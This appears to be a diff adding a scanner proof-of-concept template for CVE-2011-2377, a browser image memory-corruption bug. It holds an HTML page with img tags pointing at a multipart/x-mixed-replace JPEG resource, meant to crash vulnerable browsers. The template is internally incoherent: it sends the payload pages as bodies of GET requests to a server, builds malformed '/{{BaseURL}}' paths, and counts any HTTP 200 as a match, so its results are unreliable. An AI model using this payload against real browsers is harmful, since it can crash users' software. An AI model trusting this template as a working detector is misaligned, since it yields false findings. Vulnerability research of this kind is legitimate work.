@@ -1,0 +1,62 @@
+[info]
+author = "AVE"
+description = "检测目标浏览器是否受 multipart/x-mixed-replace 图片内存破坏漏洞影响，通过构造包含多个指向 multipart/x-mixed-replace 资源的 img 标签的 HTML 页面触发 ycc_rgb_convert 崩溃"
+id = "POC-AVE-2011-0093"
+name = "CVE-2011-2377 PoC"
+severity = "high"
+tags = ["cve-2011-2377"]
+vuln_id = [
+    "CVE-2011-2377",
+    "AVE-2011-0093",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cve-2011-2377-test.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html><body>
+<h2>CVE-2011-2377 Test</h2>
+<p>If the browser crashes or displays garbled content, it may be vulnerable.</p>
+<img src="/multipart-test?n=1">
+<img src="/multipart-test?n=2">
+<img src="/multipart-test?n=3">
+<img src="/multipart-test?n=4">
+<img src="/multipart-test?n=5">
+</body></html>"""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/multipart-test"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+--testboundary
+Content-Type: image/jpeg
+/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAABAAEDASIAAhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQAAAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWmp6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEAAwEBAQEBAQEBAQECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSExBhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYI4QlMlJDU2VWcXJSc4GRoZJTo6PUJDRUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwC/SUlJQB//2Q==
+--testboundary--
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/x-mixed-replace; boundary=--testboundary"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
